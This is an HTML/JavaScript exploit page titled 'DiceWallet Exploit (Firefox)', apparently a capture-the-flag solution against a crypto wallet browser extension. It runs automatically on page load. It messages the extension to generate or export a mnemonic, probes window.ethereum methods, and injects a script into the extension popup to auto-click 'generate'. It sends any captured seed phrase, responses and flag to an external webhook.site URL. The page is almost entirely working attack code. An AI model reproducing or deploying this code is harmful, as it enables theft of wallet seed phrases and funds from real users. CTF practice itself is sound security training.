<!DOCTYPE html>
<html>
<head>
    <title>DiceWallet Exploit - Firefox Version</title>
</head>
<body>
    <h1>DiceWallet Exploit (Firefox)</h1>
    <div id="status"></div>
    
    <script>
        const WEBHOOK_URL = 'https://a01e28d1-26bd-4236-b3de-72d0a426ca16.webhook.site';
        const EXTENSION_ID = '21b5b501-df4f-40e1-b698-e392f9fcbe7a';
        
        function log(msg) {
            document.getElementById('status').innerHTML += '<br>' + msg;
            console.log(msg);
        }
        
        function sendToWebhook(data) {
            // Dùng navigator.sendBeacon cho reliability
            const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
            navigator.sendBeacon(WEBHOOK_URL, blob);
            
            // Fallback dùng image
            new Image().src = `${WEBHOOK_URL}?data=${encodeURIComponent(JSON.stringify(data))}`;
        }
        
        async function triggerWalletGeneration() {
            log('1. Checking for extension...');
            
            // Kiểm tra xem extension có tồn tại không
            if (typeof browser === 'undefined' || !browser.runtime) {
                log('❌ browser.runtime not available');
                log('Trying chrome.runtime fallback...');
            }
            
            // Thử cả browser và chrome
            const runtime = browser?.runtime || chrome?.runtime;
            
            if (!runtime) {
                log('❌ No runtime found');
                return;
            }
            
            log('✅ Runtime found');
            
            // CÁCH 1: Gửi message trực tiếp đến background
            try {
                log('2. Sending generate message...');
                
                const response = await runtime.sendMessage(
                    EXTENSION_ID,
                    {
                        type: 'DICE_POPUP',
                        action: 'generate'
                    }
                );
                
                log('✅ Response:', response);
                sendToWebhook({
                    type: 'generate_response',
                    response: response
                });
                
                // Nếu có mnemonic
                if (response?.mnemonic) {
                    log('🎯 Got mnemonic:', response.mnemonic);
                    sendToWebhook({
                        type: 'mnemonic_captured',
                        mnemonic: response.mnemonic
                    });
                    
                    // Thử gửi flag
                    try {
                        const flagRes = await fetch('/flag', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ mnemonic: response.mnemonic })
                        });
                        const flagData = await flagRes.json();
                        if (flagData.flag) {
                            log(`🏁 FLAG: ${flagData.flag}`);
                            sendToWebhook({ type: 'flag', flag: flagData.flag });
                        }
                    } catch (e) {
                        log('Flag submit error:', e.message);
                    }
                }
                
            } catch (e) {
                log('❌ Generate failed:', e.message);
                sendToWebhook({
                    type: 'generate_error',
                    error: e.message
                });
            }
            
            // CÁCH 2: Thử các action khác
            const actions = ['addAccount', 'getState', 'exportMnemonic'];
            
            for (const action of actions) {
                try {
                    log(`Trying action: ${action}...`);
                    const response = await runtime.sendMessage(EXTENSION_ID, {
                        type: 'DICE_POPUP',
                        action: action
                    });
                    
                    log(`✅ ${action}:`, response);
                    sendToWebhook({
                        type: 'action_response',
                        action: action,
                        response: response
                    });
                    
                } catch (e) {
                    log(`❌ ${action}:`, e.message);
                }
                
                // Delay giữa các request
                await new Promise(r => setTimeout(r, 1000));
            }
            
            // CÁCH 3: Thử gọi qua window.ethereum
            if (window.ethereum) {
                log('3. Testing ethereum methods...');
                
                const methods = [
                    'eth_accounts',
                    'wallet_getState',
                    'wallet_generate',
                    'wallet_exportMnemonic'
                ];
                
                for (const method of methods) {
                    try {
                        log(`Calling ${method}...`);
                        const result = await window.ethereum.request({ method });
                        log(`✅ ${method}:`, result);
                        sendToWebhook({
                            type: 'ethereum_method',
                            method: method,
                            result: result
                        });
                    } catch (e) {
                        log(`❌ ${method}:`, e.message);
                    }
                }
            }
            
            // CÁCH 4: Mở popup và inject script
            log('4. Opening popup...');
            
            const popupUrl = `moz-extension://${EXTENSION_ID}/popup.html`;
            log('Popup URL:', popupUrl);
            
            // Thử mở popup
            const popup = window.open(popupUrl, '_blank', 'width=400,height=600');
            
            if (!popup) {
                log('Popup blocked - trying iframe');
                const iframe = document.createElement('iframe');
                iframe.src = popupUrl;
                iframe.style.width = '400px';
                iframe.style.height = '600px';
                iframe.style.position = 'fixed';
                iframe.style.top = '10px';
                iframe.style.right = '10px';
                iframe.style.zIndex = '9999';
                iframe.style.border = '4px solid red';
                document.body.appendChild(iframe);
                
                // Thử inject script vào iframe
                setTimeout(() => {
                    try {
                        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                        if (iframeDoc) {
                            log('Injecting script into iframe...');
                            
                            const script = iframeDoc.createElement('script');
                            script.textContent = `
                                // Auto-click generate button
                                setTimeout(() => {
                                    const btn = document.getElementById('btn-generate');
                                    if (btn) {
                                        btn.click();
                                        console.log('Clicked generate!');
                                        
                                        // Lấy mnemonic từ response
                                        window.addEventListener('message', (e) => {
                                            if (e.data?.type === 'DICE_RESPONSE') {
                                                fetch('${WEBHOOK_URL}', {
                                                    method: 'POST',
                                                    body: JSON.stringify(e.data)
                                                });
                                            }
                                        });
                                    }
                                }, 2000);
                            `;
                            iframeDoc.body.appendChild(script);
                        }
                    } catch (e) {
                        log('Cannot inject into iframe:', e.message);
                    }
                }, 3000);
            }
            
            log('=== Exploit Complete - Check Webhook ===');
        }
        
        // Start khi DOM ready
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', triggerWalletGeneration);
        } else {
            triggerWalletGeneration();
        }
    </script>
</body>
</html>
